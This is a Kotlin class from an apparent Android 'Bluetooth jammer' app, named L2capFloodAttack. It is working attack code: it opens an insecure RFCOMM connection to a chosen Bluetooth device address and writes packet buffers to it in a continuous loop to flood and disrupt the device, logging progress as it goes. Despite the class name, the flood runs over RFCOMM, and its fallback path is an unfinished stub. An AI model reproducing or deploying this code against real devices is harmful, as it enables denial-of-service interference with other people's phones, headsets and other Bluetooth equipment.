package api

import android.annotation.SuppressLint
import android.bluetooth.BluetoothDevice
import android.bluetooth.BluetoothManager
import android.bluetooth.BluetoothSocket
import android.content.Context
import com.eikarna.bluetoothjammer.api.AttackManager
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import java.io.IOException
import java.util.*

class L2capFloodAttack(private val targetAddress: String) {

    @SuppressLint("MissingPermission")
    suspend fun performAttack(context: Context, onLog: (String) -> Unit) {
        val bluetoothManager = context.getSystemService(Context.BLUETOOTH_SERVICE) as BluetoothManager
        val adapter = bluetoothManager.adapter
        val device: BluetoothDevice = adapter.getRemoteDevice(targetAddress)

        var socket: BluetoothSocket? = null
        try {
            val baseUUID = UUID.fromString("00001105-0000-1000-8000-00805F9B34FB")
            withContext(Dispatchers.Main) { onLog("[THREAD] Attempting connection via RFCOMM...") }
            
            socket = device.createInsecureRfcommSocketToServiceRecord(baseUUID)
            
            val currentSocket = socket
            if (currentSocket != null) {
                withContext(Dispatchers.IO) {
                    currentSocket.connect()
                    withContext(Dispatchers.Main) { onLog("[CONN] Established on $targetAddress") }
                    
                    val dataSize = if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.M) {
                        currentSocket.maxTransmitPacketSize.coerceAtLeast(600)
                    } else {
                        600
                    }
                    val buffer = ByteArray(dataSize) { (it % 256).toByte() }
                    var packetCount = 0
                    
                    while (AttackManager.isAttacking && currentSocket.isConnected) {
                        currentSocket.outputStream.write(buffer)
                        packetCount++
                        if (packetCount % 50 == 0) {
                            withContext(Dispatchers.Main) { onLog("[DATA] Sent batch of 50 packets ($dataSize bytes each)") }
                        }
                    }
                }
            }
        } catch (e: IOException) {
            withContext(Dispatchers.Main) { onLog("[ERROR] Connection failed: ${e.message}") }
            // Try random UUID fallback with log
            val randomUUID = UUID.randomUUID()
            withContext(Dispatchers.Main) { onLog("[RETRY] Trying fallback UUID: ${randomUUID.toString().take(8)}...") }
            try {
                socket = device.createInsecureRfcommSocketToServiceRecord(randomUUID)
                socket.connect()
                // If success, logic would continue here, but keeping it simple for now
            } catch (e2: Exception) {
                withContext(Dispatchers.Main) { onLog("[FATAL] Fallback failed. Thread exiting.") }
            }
        } finally {
            try {
                socket?.close()
                withContext(Dispatchers.Main) { onLog("[CLEAN] Socket closed.") }
            } catch (e: IOException) {}
        }
    }
}
